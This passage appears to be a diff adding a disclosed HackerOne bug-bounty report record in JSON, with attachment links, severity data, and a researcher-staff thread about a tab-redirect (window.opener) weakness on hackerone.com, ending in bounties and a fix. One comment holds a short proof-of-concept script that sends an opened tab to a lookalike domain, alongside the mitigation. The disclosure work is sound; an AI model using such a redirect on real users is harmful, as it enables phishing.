RBwPkoVPMgab%2BFva6rLt69nWaBZT3wd3EIEFt5XoYZDHjSKORRTdwTs%2FDCgqPEoyGhV0VrhBCUYqQbAukt7wGk7NrNDWs7mZmkL9Kv28fQIY1Q7h9exaudTPtQP0E2yZtr3wKCcWNQFiX57yas%2B0bvmeuA3ym%2BSzBLvdO1P9ziA8htBG3pApMoYNVRcJXqB9Ulg7ZaIeoGHU8ucHynNO64xiJkECfQ%2F83m0uusP%2FCbg8v%2FC8x09sz0WJsbCM5h90DddiMkeTK%2B47Ho2K%2FzWj9Vax4pTTeyBAgNycvbE1C5SdrAIC8ofvTBgjD9VJnS4%2Fm%2FaSERgD%2FpHxyUa3F9f2xwK2zzZHVjSUL9gImPRAlJZ6Nh8ldRy7Y8qAeEkVVgxlkabpkSUzkeJFYWeyAIFxnGiALPstIyZO91J3sBSrtYKPCa81FT%2BAe5FdP%2F16dX7M8G2QBoHlOCiborPNR188kYqbrtspQiMLdSdCqE06hDUFQ3PcbE8pZjc3H5dcny%2BqL2xr08qLnFp5WdXxcvFRdgKAOAiyBUtpuXF6qITm0ms7xwUQpzSFqpQFGxJNdqYxaBQFXFr1B8dripk5f1Qg734MxZRFa8OXrC0SUBclX%2FIsJJJqUWr7uq4q66njtMMLeKaRxJh4vXuOMKGmNrytwHC7GauHczb7gJBY9EaCQsEwyfu4qAY6sQHEE5yo4qz1nHc7W%2FmuNCkeiEC06BT2KXW5Ye7wR%2BJRqa4RD1Evl5MaAbKYOUm3j3RKv8ZiQXgBRIDsjMyLkeHJDlM30wkC5GTlhwpLfAXvVAeC%2BGlwLLBvL176VeFL7S7mGPxQhRCLoa8DCYKS9rPurVlp6T5EPeBgnNUxOC0WTs38l8ylcSgu2HURNvrOIIHuAxsNQYx%2Bnc4wcFv0RnkFptS7LlYhwcWV%2FKYEjxiy5O8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7842a2e36d164c064ef523407f3b095cfa4407287f2b103717b313c3913185d3",
+      "file_size": 63076,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 320362,
+      "file_name": "safari-location-data.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/320/362/a7675b693c5d0ccc99caff14823e92d8a92a50eb/safari-location-data.mp4?response-content-disposition=attachment%3B%20filename%3D%22safari-location-data.mp4%22%3B%20filename%2A%3DUTF-8%27%27safari-location-data.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5NIKTYBN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074428Z&X-Amz-Expires=438&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCM2la1GSZwFkbzZwAlaXr0SDHvL7evb0H8C%2BcAyp6rJwIgUS%2FvPViGx2g0I162nhXzz0XdF2Xh43GEuLX0y03wgpgqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDNqaUM2zKa0nRrRjPiqPBY3HR7dtjU%2FqgV%2Bme1Vi2BF0srTbVHaeVx7AXFxoOny%2FWf6dy0NtyNi5jqQtZSPTNusRUoRBEVYluoE2pTzC4h8vkvORrE9JykyZYTHH8ocgk5lc0APz3GbNdw8EDi7TxEfkQrfeNcb9De%2FCYblR%2BcD3eIOuf0HhbFpNONPshVMD2bahKYX2YefU56UpZ3VXRBwPkoVPMgab%2BFva6rLt69nWaBZT3wd3EIEFt5XoYZDHjSKORRTdwTs%2FDCgqPEoyGhV0VrhBCUYqQbAukt7wGk7NrNDWs7mZmkL9Kv28fQIY1Q7h9exaudTPtQP0E2yZtr3wKCcWNQFiX57yas%2B0bvmeuA3ym%2BSzBLvdO1P9ziA8htBG3pApMoYNVRcJXqB9Ulg7ZaIeoGHU8ucHynNO64xiJkECfQ%2F83m0uusP%2FCbg8v%2FC8x09sz0WJsbCM5h90DddiMkeTK%2B47Ho2K%2FzWj9Vax4pTTeyBAgNycvbE1C5SdrAIC8ofvTBgjD9VJnS4%2Fm%2FaSERgD%2FpHxyUa3F9f2xwK2zzZHVjSUL9gImPRAlJZ6Nh8ldRy7Y8qAeEkVVgxlkabpkSUzkeJFYWeyAIFxnGiALPstIyZO91J3sBSrtYKPCa81FT%2BAe5FdP%2F16dX7M8G2QBoHlOCiborPNR188kYqbrtspQiMLdSdCqE06hDUFQ3PcbE8pZjc3H5dcny%2BqL2xr08qLnFp5WdXxcvFRdgKAOAiyBUtpuXF6qITm0ms7xwUQpzSFqpQFGxJNdqYxaBQFXFr1B8dripk5f1Qg734MxZRFa8OXrC0SUBclX%2FIsJJJqUWr7uq4q66njtMMLeKaRxJh4vXuOMKGmNrytwHC7GauHczb7gJBY9EaCQsEwyfu4qAY6sQHEE5yo4qz1nHc7W%2FmuNCkeiEC06BT2KXW5Ye7wR%2BJRqa4RD1Evl5MaAbKYOUm3j3RKv8ZiQXgBRIDsjMyLkeHJDlM30wkC5GTlhwpLfAXvVAeC%2BGlwLLBvL176VeFL7S7mGPxQhRCLoa8DCYKS9rPurVlp6T5EPeBgnNUxOC0WTs38l8ylcSgu2HURNvrOIIHuAxsNQYx%2Bnc4wcFv0RnkFptS7LlYhwcWV%2FKYEjxiy5O8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5143ab3b47d363c635367ce3bf272576f54a3e98c5fc706712a8f4a8547a6b71",
+      "file_size": 4452426,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-05-05T17:25:46.325Z",
+  "allow_singular_disclosure_after": -138377921.83243296,
+  "singular_disclosure_allowed": true,
+  "vote_count": 144,
+  "voters": [
+    "zzero",
+    "mr-medi",
+    "n1ko",
+    "checkm50",
+    "sp1d3rs",
+    "yxw21",
+    "mashoud1122",
+    "awararesearcher",
+    "inhibitor181",
+    "fritzo",
+    "and 134 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6,
+    "asset_type": "URL",
+    "asset_identifier": "www.hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 3043156,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Thanks @fransrosen, sweet find! I can reproduce the behavior you describe. One question came up when reading your report though:\n\n> The only difference would be that this could be properly fixed and the logic of the listener in this case actually enables the attacker to fool the user related to the interaction with the site.\n\nAre you saying that an attacker can simply call `window.open` on a page and then change the `window.location` afterwards? If so, does it even matter if we fix this? I'm happy to do so, but also wondering at the same time if there's something we could put in place against the other issue you described. Let me know!",
+      "automated_response": false,
+      "created_at": "2018-07-14T02:04:41.920Z",
+      "updated_at": "2018-07-14T02:04:41.920Z",
+      "actor": {
+        "username": "jobert",
+        "cleared": true,
+        "verified": true,
+        "url": "/jobert",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 3043392,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi,\n\n> Are you saying that an attacker can simply call window.open on a page and then change the window.location afterwards? If so, does it even matter if we fix this? I'm happy to do so, but also wondering at the same time if there's something we could put in place against the other issue you described. Let me know!\n\nYes, true! And yes, there's a mitigation to it. My small example of this is like this:\n\nMalicious page runs this:\n\n```html\n<script>\nfunction openpage() {\n  b=window.open('https://hackerone.com');\n  setTimeout(function(){b.location.href='https://haaaaaackerone.com'},5000)\n}\n</script>\n<a href=\"#\" onclick=\"openpage()\">Click me</a>\n```\n\nThis will redirect the user in the new tab after 5 seconds. However, if `www.hackerone.com` always sets:\n\n```\nwindow.opener = null\n```\n\nUpon initialization, the relation of these cross-domain windows is destroyed. Chrome will get the following error:\n\n```\nThe frame attempting navigation is neither same-origin with the target, nor is it the target's parent or opener.\n```\n\nAnd Safari will get:\n\n```\nSecurityError: The operation is insecure.\n```\n\nSo yes, you can also mitigate the thing I compared the impact of the first issue with, that's a nice twist! :)\n\nRegards,\nFrans\n",
+      "automated_response": false,
+      "created_at": "2018-07-14T06:05:30.634Z",
+      "updated_at": "2018-07-14T06:05:30.634Z",
+      "actor": {
+        "username": "fransrosen",
+        "cleared": true,
+        "verified": true,
+        "url": "/fransrosen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 3048438,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi Frans,\n\nThank you for reporting this to us. This is a beautifully-written report and the proof of concept was extremely helpful in verifying the issue. I will forward this one on to the team and let them work on it. We need to somehow convince the IE11 developers to introduce full ES6 support. ;)\n\nAs always, amazing work!\n\nBest regards,\n@thefrog\n\nSecurity Analyst\n**HackerOne**",
+      "automated_response": false,
+      "created_at": "2018-07-15T17:18:28.386Z",
+      "updated_at": "2018-07-15T17:18:28.386Z",
+      "actor": {
+        "username": "thefrog",
+        "cleared": false,
+        "verified": false,
+        "url": "/thefrog",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/246/015/2eead02646771af4df7aa20c21edb7d5dc99d3da_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 3101879,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-07-26T18:07:07.918Z",
+      "updated_at": "2018-07-26T18:07:07.918Z",
+      "additional_data": {
+        "old_severity": null,
+        "new_severity": "Low (3.1)",
+        "old_severity_id": null,
+        "new_severity_id": 188707
+      },
+      "actor": {
+        "username": "jobert",
+        "cleared": true,
+        "verified": true,
+        "url": "/jobert",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 3101884,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Hi @fransrosen - thanks for the great report! We've looked at the impact of this and determined that the risks were rather low. Clever PoC, but rather easy to detect now that we've changed the UI of our sign in form ;) We're throwing in a small bonus for the great writeup!",
+      "automated_response": false,
+      "created_at": "2018-07-26T18:09:57.169Z",
+      "updated_at": "2018-07-26T18:09:57.169Z",
+      "actor": {
+        "url": "/security",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "HackerOne"
+        }
+      },
+      "bounty_amount": "500.0",
+      "bonus_amount": "250.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "security",
+      "collaborator": {
+        "username": "fransrosen",
+        "url": "/fransrosen"
+      }
+    },
+    {
+      "id": 3102162,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thank you for submitting this report to our bug bounty program. As part of our June/July bonus ladder experiment, we're rewarding you with a bonus based on your rank in the leaderboard. To see your rank, please check out @security. Happy hacking!",
+      "automated_response": false,
+      "created_at": "2018-07-26T19:20:17.584Z",
+      "updated_at": "2018-07-26T19:20:17.584Z",
+      "actor": {
+        "url": "/security",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "HackerOne"
+        }
+      },
+      "bounty_amount": "0.0",
+      "bonus_amount": "500.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "security",
+      "collaborator": {
+        "username": "fransrosen",
+        "url": "/fransrosen"
+      }
+    },
+    {
+      "id": 3112912,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks a lot! :)",
+      "automated_response": false,
+      "created_at": "2018-07-29T09:10:17.166Z",
+      "updated_at": "2018-07-29T09:10:17.166Z",
+      "actor": {
+        "username": "fransrosen",
+        "cleared": true,
+        "verified": true,
+        "url": "/fransrosen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 3437250,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @fransrosen - thanks for your patience! We've used your recommended fix to address the problem - thanks for that. Let me know if you happen to find a bypass for it. Good luck and happy hacking!",
+      "automated_response": false,
+      "created_at": "2018-10-05T04:54:47.755Z",
+      "updated_at": "2018-10-05T04:54:47.755Z",
+      "actor": {
+        "username": "jobert",
+        "cleared": true,
+        "verified": true,
+        "url": "/jobert",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "reporter": {
+        "username": "fransrosen",
+        "url": "/fransrosen"
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 4492453,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-04-05T17:25:46.258Z",
+      "updated_at": "2019-04-05T17:25:46.258Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "fransrosen",
+        "cleared": true,
+        "verified": true,
+        "url": "/fransrosen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 4492466,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-04-05T17:26:23.724Z",
+      "updated_at": "2019-04-05T17:26:23.724Z",
+      "actor": {
+        "username": "jobert",
+        "cleared": true,
+        "verified": true,
+        "url": "/jobert",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 4492467,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-04-05T17:26:23.852Z",
+      "updated_at": "2019-04-05T17:26:23.852Z",
+      "actor": {
+        "username": "jobert",
+        "cleared": true,
+        "verified": true,
+        "url": "/jobert",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
